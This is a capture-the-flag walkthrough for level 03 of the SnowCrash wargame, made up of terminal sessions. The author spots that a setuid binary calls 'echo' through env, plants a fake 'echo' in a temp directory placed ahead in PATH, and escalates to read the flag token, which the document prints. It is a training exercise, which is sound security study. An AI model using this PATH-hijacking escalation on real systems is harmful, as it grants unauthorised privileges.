## LEVEL 03

```sh
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
```

```sh
level03@SnowCrash:~$ strings level03 
...
/usr/bin/env echo Exploit me
...
```

```sh
level03@SnowCrash:~$ /usr/bin/env echo Exploit me
Exploit me
level03@SnowCrash:~$ mktemp -d
/tmp/tmp.q40U8SnOre
level03@SnowCrash:~$ echo getflag > /tmp/tmp.q40U8SnOre/echo
level03@SnowCrash:~$ chmod 777 /tmp/tmp.q40U8SnOre/echo -R
level03@SnowCrash:~$ /usr/bin/env echo Exploit me
Exploit me
level03@SnowCrash:~$ PATH=/tmp/tmp.q40U8SnOre:$PATH
level03@SnowCrash:~$ /usr/bin/env echo Exploit me
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```